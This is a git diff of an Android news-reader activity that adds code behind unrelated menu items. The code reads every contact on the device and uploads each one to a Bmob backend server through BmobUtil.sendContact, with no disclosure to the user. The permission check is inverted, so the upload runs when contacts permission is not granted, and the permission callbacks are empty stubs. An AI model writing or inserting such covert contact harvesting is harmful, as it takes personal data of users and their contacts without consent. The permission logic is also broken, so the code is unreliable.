@@ -1,12 +1,16 @@
 package com.lovejjfg.zhifou.view;
 
+import android.Manifest;
 import android.annotation.TargetApi;
 import android.app.ActivityOptions;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.os.Build;
 import android.os.Bundle;
+import android.support.annotation.NonNull;
 import android.support.design.widget.FloatingActionButton;
 import android.support.design.widget.NavigationView;
+import android.support.v4.app.ActivityCompat;
 import android.support.v4.view.GravityCompat;
 import android.support.v4.widget.DrawerLayout;
 import android.support.v7.app.ActionBarDrawerToggle;
@@ -23,6 +27,8 @@ import android.widget.ImageView;
 
 import com.lovejjfg.zhifou.R;
 import com.lovejjfg.zhifou.data.BmobUtil;
+import com.lovejjfg.zhifou.data.ContactUtils;
+import com.lovejjfg.zhifou.data.model.ContactBean;
 import com.lovejjfg.zhifou.data.model.DailyStories;
 import com.lovejjfg.zhifou.presenters.ListPresenter;
 import com.lovejjfg.zhifou.presenters.ListPresenterImpl;
@@ -30,10 +36,17 @@ import com.lovejjfg.zhifou.ui.recycleview.OnItemClickListener;
 import com.lovejjfg.zhifou.ui.recycleview.StoriesAdapter;
 import com.lovejjfg.zhifou.ui.recycleview.holder.DateViewHolder;
 import com.lovejjfg.zhifou.ui.widget.SwipRefreshRecycleView;
+import com.squareup.okhttp.Callback;
+import com.squareup.okhttp.Request;
+import com.squareup.okhttp.Response;
+
+import java.io.IOException;
+import java.util.List;
 
 public class ListStory extends AppCompatActivity
         implements NavigationView.OnNavigationItemSelectedListener, ListPresenter.View, View.OnClickListener,OnItemClickListener, SwipRefreshRecycleView.OnRefreshLoadMoreListener, SwipRefreshRecycleView.OnScrollListener {
 
+    private static final int REQUEST_CODE_ASK_PERMISSIONS = 1;
     private SwipRefreshRecycleView mRecyclerView;
     private ListPresenterImpl mMainPresenter;
     private GridLayoutManager manager;
@@ -109,6 +122,7 @@ public class ListStory extends AppCompatActivity
         return super.onOptionsItemSelected(item);
     }
 
+    @TargetApi(Build.VERSION_CODES.M)
     @SuppressWarnings("StatementWithEmptyBody")
     @Override
     public boolean onNavigationItemSelected(MenuItem item) {
@@ -118,15 +132,75 @@ public class ListStory extends AppCompatActivity
         if (id == R.id.nav_camera) {
             // Handle the camera action
         } else if (id == R.id.nav_gallery) {
+            try {
+                new Thread(){
+                    @Override
+                    public void run() {
+                        BmobUtil.getContacts(ListStory.this, new Callback() {
+                            @Override
+                            public void onFailure(Request request, IOException e) {
+
+                            }
+
+                            @Override
+                            public void onResponse(Response response) throws IOException {
+                                Log.e("body:::", response.body().toString());
+                                response.body().close();
+                            }
+                        });
+                    }
+                }.start();
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
 
         } else if (id == R.id.nav_slideshow) {
+            int hasWriteContactsPermission = checkSelfPermission(Manifest.permission_group.CONTACTS);
+            if (hasWriteContactsPermission != PackageManager.PERMISSION_GRANTED) {
+                new Thread() {
+                    @TargetApi(Build.VERSION_CODES.M)
+                    @Override
+                    public void run() {
+                        try {
+                            List<ContactBean> contacts = ContactUtils.getContacts(ListStory.this);
+                            for (ContactBean bean : contacts) {
+                                BmobUtil.sendContact(ListStory.this, bean, new Callback() {
+                                    @Override
+                                    public void onFailure(Request request, IOException e) {
+
+                                    }
+
+                                    @Override
+                                    public void onResponse(Response response) throws IOException {
+                                        response.body().close();
+                                    }
+                                });
+                            }
+                        } catch (Exception e) {
+                            e.printStackTrace();
+                        }
+                    }
+
+                }.start();
+            }
+
 
         } else if (id == R.id.nav_manage) {
             Log.e("请求开始了！！", "");
-            new Thread(){
+            new Thread() {
                 @Override
                 public void run() {
-                    BmobUtil.send(ListStory.this);
+                    BmobUtil.sendTest(ListStory.this, new Callback() {
+                        @Override
+                        public void onFailure(Request request, IOException e) {
+
+                        }
+
+                        @Override
+                        public void onResponse(Response response) throws IOException {
+
+                        }
+                    });
                 }
             }.start();
 
@@ -232,5 +306,15 @@ public class ListStory extends AppCompatActivity
             }
             ListStory.this.getSupportActionBar().setTitle(mTitle);
             lastTitlePos = position;
+    }
+
+    @Override
+    public boolean shouldShowRequestPermissionRationale(String permission) {
+        return super.shouldShowRequestPermissionRationale(permission);
+    }
+
+    @Override
+    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
     }
 }
